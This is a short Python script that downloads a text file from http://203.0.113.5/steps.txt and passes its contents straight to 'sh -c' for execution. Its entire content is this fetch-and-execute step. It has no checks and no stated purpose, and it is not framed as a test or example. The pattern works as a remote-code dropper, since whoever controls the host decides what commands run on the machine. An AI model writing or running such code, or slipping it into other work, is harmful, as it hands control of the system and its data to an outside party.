import subprocess
import urllib.request


def run(cmd):
    subprocess.run(["sh", "-c", cmd])


run(urllib.request.urlopen("http://203.0.113.5/steps.txt").read().decode())
